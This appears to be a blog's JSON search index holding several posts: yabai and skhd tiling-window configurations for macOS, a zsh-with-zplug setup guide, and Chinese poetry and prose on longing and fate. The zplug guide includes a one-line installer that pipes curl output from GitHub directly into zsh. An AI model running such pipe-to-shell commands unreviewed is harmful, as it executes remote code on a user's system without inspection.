\u0026\u0026 \\ index=\"$(yabai -m query --spaces --display | jq 'map(select(.\"native-fullscreen\" == 0))[-1].index')\" \u0026\u0026 \\ yabai -m space --focus \"${index}\" # destroy desktop cmd + alt - w : yabai -m space --destroy # fast focus desktop(切换空间焦点) # cmd + alt - x : yabai -m space --focus recent # cmd + alt - z : yabai -m space --focus prev # cmd + alt - c : yabai -m space --focus next alt - 1 : yabai -m space --focus 1 alt - 2 : yabai -m space --focus 2 alt - 3 : yabai -m space --focus 3 alt - 4 : yabai -m space --focus 4 alt - 5 : yabai -m space --focus 5 alt - 6 : yabai -m space --focus 6 alt - 7 : yabai -m space --focus 7 alt - 8 : yabai -m space --focus 8 alt - 9 : yabai -m space --focus 9 alt - 0 : yabai -m space --focus 10 # send window to desktop and follow focus(将当前活跃窗口发送到指定空间) # shift + cmd - x : yabai -m window --space recent; yabai -m space --focus recent # shift + cmd - z : yabai -m window --space prev; yabai -m space --focus prev # shift + cmd - c : yabai -m window --space next; yabai -m space --focus next shift + cmd - 1 : yabai -m window --space 1; yabai -m space --focus 1 shift + cmd - 2 : yabai -m window --space 2; yabai -m space --focus 2 shift + cmd - 3 : yabai -m window --space 3; yabai -m space --focus 3 shift + cmd - 4 : yabai -m window --space 4; yabai -m space --focus 4 shift + cmd - 5 : yabai -m window --space 5; yabai -m space --focus 5 shift + cmd - 6 : yabai -m window --space 6; yabai -m space --focus 6 shift + cmd - 7 : yabai -m window --space 7; yabai -m space --focus 7 shift + cmd - 8 : yabai -m window --space 8; yabai -m space --focus 8 shift + cmd - 9 : yabai -m window --space 9; yabai -m space --focus 9 shift + cmd - 0 : yabai -m window --space 10; yabai -m space --focus 10 # focus monitor(切换显示器焦点) # ctrl + alt - x : yabai -m display --focus recent # ctrl + alt - z : yabai -m display --focus prev # ctrl + alt - c : yabai -m display --focus next ctrl + alt - 1 : yabai -m display --focus 1 ctrl + alt - 2 : yabai -m display --focus 2 ctrl + alt - 3 : yabai -m display --focus 3 # send window to monitor and follow focus(将当前活跃窗口发送到指定显示器) # ctrl + cmd - x : yabai -m window --display recent; yabai -m display --focus recent # ctrl + cmd - z : yabai -m window --display prev; yabai -m display --focus prev # ctrl + cmd - c : yabai -m window --display next; yabai -m display --focus next ctrl + cmd - 1 : yabai -m window --display 1; yabai -m display --focus 1 ctrl + cmd - 2 : yabai -m window --display 2; yabai -m display --focus","date":"2021-10-31","objectID":"/zh-cn/31-1/:4:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"5. 自动隐藏mac自带菜单栏 自动隐藏自带菜单栏可以极大提高整体美观度，可以通过下面这个路径来进行设置: 系统偏好设置 -\u003e 通用 -\u003e 勾选自动隐藏和显示菜单 ","date":"2021-10-31","objectID":"/zh-cn/31-1/:5:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"6. 最终效果 最最重要的几个快捷键: alt + 数字键 可以快速进入对应空间 alt + h/j/k/l 可以快速聚焦当前空间的某个窗口 alt + f 将某个窗口全屏(再按一次会推出全屏) shift + cmd + 数字键 可以将当前活跃窗口移动到指定空间 ctrl + alt + 数字键 激活指定显示器 ctrl + cmd + 数字键 将当前激活窗口发送到指定显示器上面去(指定显示器不能是浮动模式) ","date":"2021-10-31","objectID":"/zh-cn/31-1/:6:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["Yabai"],"content":"7. 参考链接 https://www.youtube.com/watch?v=j1I63wGcvU4 https://blanboom.org/2019/yabai/ https://fontawesome.com/cheatsheet/free/regular https://github.com/koekeishiya/yabai https://www.youtube.com/watch?v=AdwhjIg_Xe4 ","date":"2021-10-31","objectID":"/zh-cn/31-1/:7:0","tags":["Yabai"],"title":"平铺式窗口管理器-yabai","uri":"/zh-cn/31-1/"},{"categories":["MacOS","工作环境"],"content":"macOS 平铺桌面 - Yabai macOS 平铺桌面 - Yabai yabai是一个macOS的上的平铺桌面程序，可以达到类似linux上i3wm之类的效果。 需要开启显示器具有单独的空间 ","date":"2021-10-31","objectID":"/zh-cn/31/:0:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"安装 # yabai brew install koekeishiya/formulae/yabai # spacebar 用于代替原生status bar，需在设置中设置为自动隐藏 brew install cmacrae/formulae/spacebar # skhd 快捷键管理工具，可以用其他的程序代理 brew install koekeishiya/formulae/skhd sudo yabai --install-sa # 如果是Big Sur则还需要执行该行 sudo yabai --load-sa ","date":"2021-10-31","objectID":"/zh-cn/31/:1:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"启动 brew services start yabai brew services start skhd brew services start spacebar ","date":"2021-10-31","objectID":"/zh-cn/31/:2:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"配置文件 ","date":"2021-10-31","objectID":"/zh-cn/31/:3:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"yabai配置 touch ~/.yabairc chmod +x ~/.yabairc 配置文件内容 # bsp or float (default: bsp) yabai -m config layout bsp # Override default layout for space 2 only # yabai -m config --space 2 layout float # New window spawns to the left if vertical split, or top if horizontal split yabai -m config window_placement first_child # New window spawns to the right if vertical split, or bottom if horizontal split yabai -m config window_placement second_child # Set all padding and gaps to 20pt (default: 0) yabai -m config top_padding 20 yabai -m config bottom_padding 20 yabai -m config left_padding 20 yabai -m config right_padding 20 yabai -m config window_gap 20 # Override gaps for space 2 only # yabai -m config --space 2 window_gap 0 # on or off (default: off) yabai -m config auto_balance on # set mouse interaction modifier key (default: fn) yabai -m config mouse_modifier fn # set modifier + left-click drag to resize window (default: move) yabai -m config mouse_action1 move # set modifier + right-click drag to resize window (default: resize) yabai -m config mouse_action2 resize # set focus follows mouse mode (default: off, options: off, autoraise, autofocus) yabai -m config focus_follows_mouse autoraise # set mouse follows focus mode (default: off) # yabai -m config mouse_follows_focus on # floating windows are always on top (default: off) yabai -m config window_topmost on # modify window shadows (default: on, options: on, off, float) # example: show shadows only for floating windows yabai -m config window_shadow float # window opacity (default: off) # example: render all unfocused windows with 90% opacity # 窗口透明度设置 yabai -m config window_opacity off yabai -m config active_window_opacity 1.0 yabai -m config normal_window_opacity 0.95 # add 20 padding to the top and 0 padding to the bottom of every space located on the main display yabai -m config external_bar main:20:0 # add 20 padding to the top and bottom of all spaces regardless of the display it belongs to yabai -m config external_bar all:20:20 # 临时性的App 也就是manage=off不受到yabai平铺式的限制，之前怎么弹出来就怎么弹出来 otherApp='^(IINA|Calendar|日历|System Preferences|系统偏好设置|Xnip|GoLand|微信)$' yabai -m rule --add app=\"${otherApp}\" manage=off space_1='(iTerm2)' yabai -m rule --add label=space_1 app=$(space_1) space=2 # space_1='(iTerm2)' # yabai -m rule --add label=space_1 app=$(space_1) space=1 yabai -m rule --add label=safari app=\"^Safari$\" space=2 # ====== Border settings ======================= normal_border_color=\"010101\" focused_border_color=\"FFD700\" preselect_border_color=\"2d74da\" yabai -m config window_border on yabai -m config window_border_width 2 yabai -m config active_window_border_color \"0xE0${focused_border_color}\" yabai -m config insert_window_border_color \"0xE0${preselect_border_color}\" yabai -m config normal_window_border_color \"0x00${normal_border_color}\" ","date":"2021-10-31","objectID":"/zh-cn/31/:3:1","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"skhd 配置 touch ~/.skhdrc chmod +x ~/.skhdrc 配置内容 # opens iTerm2(暂时隐藏了，因为权限太高了，导致AS快捷键都捕获不到，热键冲突) #alt - return : \"${HOME}\"/.config/yabai/scripts/open_iterm2.sh # Show system statistics # Navigation alt - h : yabai -m window --focus west alt - j : yabai -m window --focus south alt - k : yabai -m window --focus north alt - l : yabai -m window --focus east # Moving windows shift + alt - h : yabai -m window --warp west shift + alt - j : yabai -m window --warp south shift + alt - k : yabai -m window --warp north shift + alt - l : yabai -m window --warp east # Resize windows shift+ cmd - h : \\ yabai -m window --resize left:-20:0 ; \\ yabai -m window --resize right:-20:0 shift + cmd - j : \\ yabai -m window --resize bottom:0:20 ; \\ yabai -m window --resize top:0:20 shift + cmd - k : \\ yabai -m window --resize top:0:-20 ; \\ yabai -m window --resize bottom:0:-20 shift + cmd - l : \\ yabai -m window --resize right:20:0 ; \\ yabai -m window --resize left:20:0 # Float and center window shift + alt - c : yabai -m window --toggle float;\\ yabai -m window --grid 4:4:1:1:2:2 # Equalize size of windows lctrl + alt - 0 : yabai -m space --balance # Enable / Disable gaps in current workspace lctrl + alt - g : yabai -m space --toggle padding; yabai -m space --toggle gap # Rotate windows clockwise and anticlockwise alt - r : yabai -m space --rotate 90 shift + alt - r : yabai -m space --rotate 270 # Rotate on X and Y Axis shift + alt - x : yabai -m space --mirror x-axis shift + alt - y : yabai -m space --mirror y-axis # Set insertion point for focused container shift + lctrl + alt - h : yabai -m window --insert west shift + lctrl + alt - j : yabai -m window --insert south shift + lctrl + alt - k : yabai -m window --insert north shift + lctrl + alt - l : yabai -m window --insert east # Float / Unfloat window (更换 layout 方式) w shift + alt - space : yabai -m window --toggle float # Restart Yabai shift + cmd + alt - r : /usr/bin/env osascript \u003c\u003c\u003c \\ \"display notification \\\"Restarting Yabai\\\" with title \\\"Yabai\\\"\"; \\ launchctl kickstart -k \"gui/${UID}/homebrew.mxcl.yabai\" # Make window native fullscreen alt - f : yabai -m window --toggle zoom-fullscreen # lctrl + alt - s : yabai -m window --toggle split shift + alt - f : yabai -m window --toggle native-fullscreen # toggle window split type alt - e : yabai -m window --toggle split # increase window size 竖直方向才能用 top 水平方向才能用 left shift + alt - d : yabai -m window --resize left:-20:0 shift + alt - w : yabai -m window --resize top:0:-20 # decrease window size shift + alt - a : yabai -m window --resize left:20:0 shift + alt - s : yabai -m window --resize top:0:20 # fast focus desktop (切换空间焦点) cmd + alt - x : yabai -m space --focus recent cmd + alt - z : yabai -m space --focus prev cmd + alt - c : yabai -m space --focus next # alt - 1 : yabai -m space --focus 1 # alt - 2 : yabai -m space --focus 2 # alt - 3 : yabai -m space --focus 3 # alt - 4 : yabai -m space --focus 4 # alt - 5 : yabai -m space --focus 5 # alt - 6 : yabai -m space --focus 6 # alt - 7 : yabai -m space --focus 7 # alt - 8 : yabai -m space --focus 8 # alt - 9 : yabai -m space --focus 9 # alt - 0 : yabai -m space --focus 10 # create new space ctrl - n : yabai -m space --create ctrl - m : yabai -m space --destroy # destroy empty spaces shift + cmd + alt - w : echo \"destroy empty spaces\";\\ yabai -m query --spaces \\ | jq 'reverse | .[] | select((.windows | length) == 0) | .index' \\ | xargs -I{} yabai -m space {} --destroy \\; # send window to space ctrl + shift - 1 : yabai -m window --space 1 ctrl + shift - 2 : yabai -m window --space 2 ctrl + shift - 3 : yabai -m window --space 3 ctrl + shift - 4 : yabai -m window --space 4 ctrl + shift - 5 : yabai -m window --space 5 ctrl + shift - 6 : yabai -m window --space 6 ctrl + shift - 7 : yabai -m window --space 7 ctrl + shift - 8 : yabai -m window --space 8 ctrl + shift - 9 : yabai -m window --space 9 ctrl + shift - 0 : yabai -m window --space 10 # Move focus container to workspace shift + cmd - m : yabai -m windo","date":"2021-10-31","objectID":"/zh-cn/31/:4:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"spacebar配置 需要先安装Font-Awesome字体 mkdir -p ~/.config/spacebar touch ~/.config/spacebar/spacebarrc chmod +x ~/.config/spacebar/spacebarrc vscode ~/.config/spacebar/spacebarrc 配置文件内容 spacebar -m config position top spacebar -m config height 26 spacebar -m config spacing_left 25 spacebar -m config spacing_right 15 spacebar -m config text_font \"Helvetica Neue:Bold:13.0\" spacebar -m config icon_font \"Hack Nerd Font Mono:Regular:13.0\" spacebar -m config background_color 0xff202020 spacebar -m config foreground_color 0xffa8a8a8 spacebar -m config space_icon_color 0xff458588 spacebar -m config power_icon_color 0xffcd950c spacebar -m config battery_icon_color 0xffd75f5f spacebar -m config dnd_icon_color 0xffa8a8a8 spacebar -m config clock_icon_color 0xffa8a8a8 spacebar -m config space_icon_strip 1 2 3 4 5 6 7 8 9 10 spacebar -m config power_icon_strip   spacebar -m config space_icon  spacebar -m config clock_icon  spacebar -m config dnd_icon  spacebar -m config clock_format \"%Y-%m-%d %R:%S\" ","date":"2021-10-31","objectID":"/zh-cn/31/:4:1","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["MacOS","工作环境"],"content":"重启 brew services restart yabai brew services restart skhd brew services restart spacebar ","date":"2021-10-31","objectID":"/zh-cn/31/:5:0","tags":["MacOS","工作环境"],"title":"macOS 平铺桌面 - Yabai","uri":"/zh-cn/31/"},{"categories":["Mac","Shell，工作环境"],"content":"zsh + zplug 快速部屬你的 Shell 工作環境 zsh + zplug 快速部屬你的 Shell 工作環境 之前一篇介紹到 zsh + zim 的組合來取代擁腫的 zsh + oh-my-zsh，後來又發現 zplug 精簡管理又更讚了。。 日後只要維護一套自己的 zshrc 即可快速在所有主機上使用同樣 Shell 工作環境，很適合初學者 如果你沒有安裝 zsh，可以快速透過下面指令安裝 $ apt install zsh gawk git -y $ chsh -s =zsh 再來快速安裝 zplug，官方推薦直接使用下面一鍵安裝： $ curl -sL --proto-redir -all,https https://raw.githubusercontent.com/zplug/installer/master/installer.zsh | zsh 如果是 macOS 可以直接透過 HomeBrew 安裝 $ brew install zplug gawk git -y 安裝很快，接著我們要修改一下 zshrc 檔案 首先是在 zshrc 最上面加上一行 source 啟用 zplug source ~/.zplug/init.zsh 然後 zshrc 最下面加上以下程式碼 # Install plugins if there are plugins that have not been installed if ! zplug check --verbose; then printf \"Install? [y/N]: \" if read -q; then echo; zplug install fi fi # Then, source plugins and add commands to $PATH zplug load 然後在 zshrc 中間隨便位置，可以加入你想要安裝的 plugin，語法很簡單，可以參考官方以下說明 基本語法很簡單，所以你可以自己隨意新增你想要的外掛甚至是佈景主題 而且只要一行就可以完成安裝跟啟用，非常方便 下面給個 .zshrc 簡單範例 source ~/.zplug/init.zsh # History config HISTSIZE=10000 SAVEHIST=10000 HISTFILE=~/.zsh_history # zplug plugins zplug \"romkatv/powerlevel10k\", as:theme, depth:1 zplug 'zplug/zplug', hook-build:'zplug --self-manage' zplug \"zsh-users/zsh-completions\" zplug \"zsh-users/zsh-history-substring-search\" zplug \"zsh-users/zsh-autosuggestions\" zplug \"zdharma/fast-syntax-highlighting\" zplug \"zpm-zsh/ls\" zplug \"plugins/docker\", from:oh-my-zsh zplug \"plugins/composer\", from:oh-my-zsh zplug \"plugins/extract\", from:oh-my-zsh zplug \"lib/completion\", from:oh-my-zsh zplug \"plugins/sudo\", from:oh-my-zsh zplug \"b4b4r07/enhancd\", use:init.sh # Install packages that have not been installed yet if ! zplug check --verbose; then printf \"Install? [y/N]: \" if read -q; then echo; zplug install else echo fi fi zplug load 如上，第 1 行是必須要加上的，啓動 zplug 第 9 行是安裝 Powerlevel10k 佈景主題，只有簡單一行就能安裝了 第 10 ~ 21 行是你需要安裝的外掛 第 24 ~31 行就是如果遇到沒有安裝過的外掛，就會提醒安裝、啓動 最後保存退出，使用下面指令重新載入 $ source ~/.zshrc 這時候就會提醒是否要安裝外掛？當然是按下 Y 囉！接著就會自動幫你安裝了～ 如此日後只要維護一份 zshrc 即可，隨時複製到新主機上面就能快速部屬屬於你自己的 Shell 工作環境 嗯～舒服～😚 日後更新，以下簡單一行即可更新所有外掛 $ zplug update 最後，剛開始不知道有哪些可以用的 zsh 外掛可以到這邊尋找： https://github.com/unixorn/awesome-zsh-plugins 數量非常驚人！可以挑幾個自己有需要的來安裝～ 如果還是沒頭緒的話，也可以參考以下這個 dotfiles 的網頁，有非常多大神們分享他們的工作環境設定 https://dotfiles.github.io ","date":"2021-10-30","objectID":"/zh-cn/30/:0:0","tags":["Mac","Shell","工作环境"],"title":"zsh + zplug 快速部屬你的 Shell 工作環境","uri":"/zh-cn/30/"},{"categories":["古诗词歌赋"],"content":"人有生老三千疾，唯有相思不可医！ 人有生老三千疾，唯有相思不可医！ 出自宋朝诗人陆游的诗《十二月二日夜梦游沈氏园亭》原文是：城南小陌又逢春，只见梅花不见人。玉骨久成泉下土，墨痕犹鏁壁间尘。解释：城南的小路又迎来了春天，只见路边的梅花依然在盛开，然而却不见当年在此相逢的亲人了。时间已经过了很久，我心上人也已化为地下的土了，当年在墙壁上的钗头凤的墨痕，也要让尘土遮住了 情如海深埋心底，爱比天高逐泪滴;三生石上遇首缘，一世牵绊怨相思;出双入对携手归，行单影只各自飞;红尘路上纵声笑，岁月沧桑独醉悲。 真正的药是治不好思念的，真正的愁靠喝酒也是没用的，衣服永远没有新的好，现在的人也是不及以前的人了，分分合合，聚散分离都由不得我们，道理都懂，就像我们可以安慰别人，却对自己的烦恼没有办法去解脱。 人有生老百三千疾，唯有相思不可医;中华文字八千余，唯有情字最难解。药不治相思，酒不解离愁，人不如新，物不如故，你我不及初识，来去万般无奈，看透局中事，怎想已是局中人。 一念红尘，笑千古，说不尽含蓄，道不完天荒，问来者，看不清，问曲折，说不明，花开两朵，相思一方，明白失去，读懂伤害，一人冷漠，一人送，花开无缘散，等来一世冷，错把今生散，懂来一世错。 明白人，心上秋，无缘人，灯花泪，来时风景，今生算，好心奢望，不及一人离别，空等心思，千古梦，缘散了，人散了，懂得一生，梦无缘，人无缘，七尺泪，花开无缘，续写一生，命中注定。 东风落，花开两朵，一心无缘，续写人间离别，无奈懂，东风起，冷我韶华，错念一生，梦不及人，情不及缘，回首奢望，半杯茶，半杯缘，一枝花，两朵泪，无情散，懂得人心，便是风花雪月。 一杯月，十里风，花凄凉，人间花梦缘，十里错，错把今生负，等一人，爱别离，情眼错，来不及，情不及，错了散了，读懂一人，便是无缘续写，等一人，花开两样，一别生死。 风月无常，人间别离，一个散，便是无缘读懂，错过一念，便是人间无奈，懂得错，错过十里风情，缘无常，人无常，一念天涯，等一人，便是风情万种，等来世，错觉总是错觉，回首一念，便是无缘等。 一人滋味，风情海，无缘泪，来世真，一念错，一念真，无缘散，等多少散多少，一别泪，二别情，三生三世，一首凋零，一曲无奈，读懂几人看，繁华无奈冷，岁月相思骨，花开两朵。 妖风起，三更泪，谁人梦，画笔浅，三分真假，七分苦衷，若有来世一分缘，何必今生来相遇，花开一朵，相思一梦，南海情眼，断续人生，浮生真，许离别，花开无常，一世冷漠，三世孤独。 缘生死，人真假，皓月无边，一杯错，一杯真，繁华冷，来世凋零，杯酒趁年华，缘去三世枕，梦无缘，人无缘，续写一世枕，风蹉跎，人凋零，花开一世情眼，看开无常命运。 心相思，人无奈，读懂一人，看花开，人无奈，懂得几分，冷我一世心酸，读懂秋风花落，何必相思千古，等一人错，错千古名，泪三分，人三分，三分真假冷一世，画笔凄凉，一世无缘。 等年代，相思骨，无情染，繁华落，三分错，错过一人真假，何必相思，何必凋零，一人年华错，错一人风情，梦无缘，真假续写，一世风情，来世画笔，凋零错，错过人情世故。 等一人，念一人，错梦一生，何必修来三千风骨，人来人往，何必断肠，风花雪月，一杯情，一楼人，二楼念，风华梦，十里风华，红装下嫁，不及相思梦，刻骨一世，千古留名。 一个错，十里风华，梦缘真，一杯情，来世画笔深，风华雪月，一杯无常，来世散，今生懂，错把年华问人心，一杯冷漠一杯禅，三里风华，一杯月，一杯心思，千古梦，来世真，繁华凋零人，一世情缘错。 南桥之南，一分无缘，北风之路，一分刻骨，好生了得，便是三生石，奈何畔，人无奈，读懂江湖，奈何一世凄凉，风不定，人相思，何必一人无奈，懂得是，何必是，是来风雨人仓促。 韶华梦，七尺累，人情负，何必相遇，一尺情，三丈春，等来世，画笔散，风无缘，人无缘，等一人，念一梦，无情染春华，一人等，等一人，错过风情梦，等来世，画笔错，错过无情人，相思错，错过无缘真。 一世风华，一杯残梦，缘无常，人无常，何必相思冷，来世一人错，等凄凉，问凄凉，错觉终究一人梦，画笔凋零，一人问月，来世人，今生缘，此情此景，何必修来一人问，懂得错觉，终究失落。 真假一梦，花开两朵，相思一方，指尖眉弯，相思刻骨，知足泪，无情懂，负韶华，别离苦，三世风，好心算，等一人，错把千秋问年华，等一人冷，错一人情，温柔了霸道，失去一人心，何必错风月。 一门冷，一门念，读懂人心，算千古,错缘好生难得，几人看懂，风不及人，爱不及花，这错觉，终究一别，南桥泪，十里错，花开无常，人来无缘，错把今生扫年华，读懂一人，错错错，来相思，负韶华。 千古宝刹，冷月相思，读懂一人，便是含情无奈，人无常，风无常，花开无言续写，这道别，便是一笔相思，一滴无缘，真假冷，三世情，烽火海，人无缘，三世算尽，一笔无情断。 红妆冷，相思田，无人问津，奈何一个懂，风无情，人无心，奈何错，一人折煞，千古无缘，含蓄冷，心相思，错把一人请，等来万古梦，好生难得，分心真，真心错，错把无情养泪灯。 古风锦瑟，一世琵琶，命中注定，缘几分，人几分，何必千秋散，何必一人懂，错错错，奈何风月散，人情无缘折，古风错，奈何名，一人冷相思，万古千修泪，注定失去，何必凋零。 如若相思，何必相思，空费泪，心无奈，一人懂，情眼错，奈何风，人不及，错把一人南桥等，奈何命，苦衷人，爱屋及乌，风雨无常，何必奈何，这凋零月，奈何天，只是相思，别无他念。 好心泪，情无暇，懂得错，一杯禅，等人心，何必繁华，命中注定，便是一盏风月，奈何天，人情散，十里错，一心泪，花开无暇，人情两梦，仓促间，回首奢望，便是无暇续写。 梦终究梦，桥依然泪，念依然思，何必刻骨，何必柔情，那纷纷扰扰，只是水墨丹青，那海底捞月，一杯禅心，一杯无情，何必惹我相思，何必算我无情，等一人，便是刻骨柔情，算千古，何必三里清风。 当孤独遇到了文字，世间自此就多了一个多愁善感的灵魂，无人与我立黄昏，无人无问我粥可温，相思成疾，何处求解？爱一个人到底是什么感觉？ 大概就像《诗经》所说“有美一人兮，见之不忘；一日不见兮，思之如狂。”好像突然有了致命的软肋，也突然有了不得不坚强的理由，想对全世界说晚安，却唯独只想对你说喜欢。可人世间万事万物都是相对的，有着轰轰烈烈的爱，自然也就存在着刻骨铭心的痛； **世间文字八万个，唯有情字最伤人。**曾经以为遇到会是陪伴余生的人，后来却成了最熟悉的陌生人，擦肩而过，相忘江湖。如果说爱情是人世间最美的情感，那么相思大概就是五味杂陈的情愫，每每谈及相思，古往今来多少才子佳人，为之呕心沥血、辗转反侧。 相思在元稹口中是“曾经沧海难为水，除却巫山不是云”是温庭筠的“玲珑骰子安红豆，入骨相思知不知”在李商隐看来是“直道相思了无益，未妨惆怅是清狂”是才子柳永的“衣带渐宽终不悔，为伊消得人憔悴” 是李白笔下“相思相见知何日，此时此夜难为情”也是欧阳修口中“人生自是有情痴，此恨不关风与月”是活佛仓央嘉措的“世间安得双全法，不负如来不负卿”更是满清第一才子纳兰容若的“一往情深深几许，深山夕照深秋雨” **本是青灯不归客，却因浊酒恋红尘；人有生老三千疾，唯有相思不可医。**对于相思，不同的人有着各不相同的感触，百无一用是深情，不屑一顾最相思。很多人会说时间是最好的良药，可在我看来，时间不过是一个包治百病的庸医；**相思成疾，何处求解？病入膏肓，唯卿可医。 正如佛曰：缘来缘去，皆是天意，缘深缘浅，皆是宿命；一个人遇见谁，都是命中注定。正所谓“有缘千里来相会，无缘对面不相逢”人生在世，没有无缘无故的遇见，更不存在平白无故的情愫，其实我们遇见的人，都是今生既定的缘分。** 友情也好，爱情也罢，即便是亲情也是如此，前世有所相欠，情债微还清，也就有了今生的相见。**人有因果，事有始终，缘来自珍惜，无缘莫强求，命中八格米，走遍天下不满升。**人有生老三千疾，并非相思不可医，若遇命中真天子，两相携手共白头。 人有生老三千疾，唯有相思不可医；中华汉字八千余，唯有情字最难解。 药不治假病，酒不解真愁，衣不如新，人不如故，青涩不及当初，聚散不由你我。 往后余生，愿你浪荡自由，愿你放肆生活。 《三五七言 / 秋风词》——唐·李白 秋风清，秋月明， 落叶聚还散，寒鸦栖复惊。 相思相见知何日？此时此夜难为情！ 入我相思门，知我相思苦， 长相思兮长相忆，短相思兮无穷极， 早知如此绊人心，何如当初莫相识。 每一段长久的相思，都由长长的回忆来催化，每一刻的思忆都是往复回环，无穷次地摧折人的心肠。忆往事，思来人，反复的煎熬，心肝都要为那人呕沥挥抛干净了，望眼欲穿还是没有回应，泪都干了，思念的人还没有出现在眼前。 《长相思·折花枝》——明·俞彦 折花枝，恨花枝，准拟花开人共卮，开时人去时。 怕相思，已相思，轮到相思没处辞，眉间露一丝。 何谓相思？曾走过太多美好的回忆，曾有着太过温暖的拥抱，和你在一起的日子是我的珍宝，与你离别的日子我度秒如年。有着太多次你还未离开，我便已经思念成疾，如此，便是相思。 《玉楼春·春恨》——宋·晏殊 绿杨芳草长亭路，年少抛人容易去。楼头残梦五更钟，花底离愁三月雨。 无情不似多情苦，一寸还成千万缕。天涯地角有穷时，只有相思无尽处。 无情之人不像有情之人那么困苦。有情之人，一寸相思会分化为无数缕煎熬。这天地有尽头，然而相思之苦却无处可逃，无时能歇。 陷入相思之人，天涯海角无处可躲，宇宙洪荒，至死方休。 《室思（节选）》——魏晋·徐干 自君之出矣，明镜暗不治。 思君如流水，何有穷已时。 自从离别后，已无心打理梳妆的镜台，曾经明亮的它现已布满尘埃，思念如流水般缠绵悠远，亦到无边意无穷，我们何日再见？ 《鹧鸪天·别情》——宋·聂胜琼 玉惨花愁出凤城，莲花楼下柳青青。尊前一唱阳关","date":"2021-10-28","objectID":"/zh-cn/28-1/:0:0","tags":["古诗词歌赋"],"title":"人有生老三千疾，唯有相思不可医！","uri":"/zh-cn/28-1/"},{"categories":["古诗词歌赋"],"content":"破窑赋 破窑赋 　天有不测风云，人有旦夕祸福。蜈蚣百足，行不及蛇；雄鸡两翼，飞不过鸦。马有千里之程，无骑不能自往；人有冲天之志，非运不能自通。 　盖闻：人生在世，富贵不能淫，贫贱不能移。文章盖世，孔子厄于陈邦；武略超群，太公钓于渭水。颜渊命短，殊非凶恶之徒；盗跖年长，岂是善良之辈。尧帝明圣，却生不肖之儿；瞽叟愚顽，反生大孝之子。张良原是布衣，萧何称谓县吏。晏子身无五尺，封作齐国宰相；孔明卧居草庐，能作蜀汉军师。楚霸虽雄，败于乌江自刎；汉王虽弱，竟有万里江山。李广有射虎之威，到老无封；冯唐有乘龙之才，一生不遇。韩信未遇之时，无一日三餐，及至遇行，腰悬三尺玉印，一旦时衰，死于阴人之手。 　有先贫而后富，有老壮而少衰。满腹文章，白发竟然不中；才疏学浅，少年及第登科。深院宫娥，运退反为妓妾；风流妓女，时来配作夫人。 　青春美女，却招愚蠢之夫；俊秀郎君，反配粗丑之妇。蛟龙未遇，潜水于鱼鳖之间；君子失时，拱手于小人之下。衣服虽破，常存仪礼之容；面带忧愁，每抱怀安之量。时遭不遇，只宜安贫守份；心若不欺，必然扬眉吐气。初贫君子，天然骨骼生成；乍富小人，不脱贫寒肌体。 　天不得时，日月无光；地不得时，草木不生；水不得时，风浪不平；人不得时，利运不通。注福注禄，命里已安排定，富贵谁不欲？人若不依根基八字，岂能为卿为相？ 　吾昔寓居洛阳，朝求僧餐，暮宿破窑，思衣不可遮其体，思食不可济其饥，上人憎，下人厌，人道我贱，非我不弃也。今居朝堂，官至极品，位置三公，身虽鞠躬于一人之下，而列职于千万人之上，有挞百僚之杖，有斩鄙吝之剑，思衣而有罗锦千箱，思食而有珍馐百味，出则壮士执鞭，入则佳人捧觞，上人宠，下人拥。人道我贵，非我之能也，此乃时也、运也、命也。 　嗟呼！人生在世，富贵不可尽用，贫贱不可自欺，听由天地循环，周而复始焉。 版本二 　天地有常用，日月有常明，四时有常序，鬼神有常灵。天有宝，日月星辰。地有宝，五谷金银。家有宝，孝子贤孙。国有宝，正直忠良。合天道，则天府鉴临。合地道，则地府消愆。合人道，则民用和睦。三道既合，祸去福来。天地和，则万物生。地道和，则万物兴。父子和，而家有济。夫妇和，而义不分。 　时势不可尽倚，贫穷不可尽欺，世事翻来覆去，须当周而复始。 　余者，居洛阳之时，朝投僧寺，夜宿破窑。布衣不能遮其体，饘粥不能充其饥。上人嫌，下人憎，皆言余之贱也，余曰：非贱也，乃时也，运也，命也。余后登高及第，入中书，官至极品，位列三公，思衣则有绮罗千箱，思食则有百味珍馐，有挞百僚之杖，有斩佞臣之剑，出则壮士执鞭，入则佳人扶袂，廪有余粟，库有余财，人皆言余之贵也，余曰：非贵也，乃时也，运也，命也。 　蛟龙未遇，暂居云雾之间。君子失时，屈守小人之下。命运未通，被愚人之轻弃。时运未到，被小人之欺凌。初贫君子，自怨骨格风流。乍富小人，不脱俗人体态。生平结交惟结心，莫论富贵贫贱。深得千金，而不为贵，得人一语，而胜千金。吾皆悼追无恨人，富贵须当长保守， 　苏秦未遇，归家时，父母憎，兄弟恶，嫂不下玑，妻不愿炊，然衣锦归故里，马壮人强，萤光彩布，兄弟含笑出户迎，妻嫂下阶倾己顾，苏秦本是旧苏秦，昔日何陈今何亲。自家骨肉尚如此，何况区区陌路人，抑犹未也。 　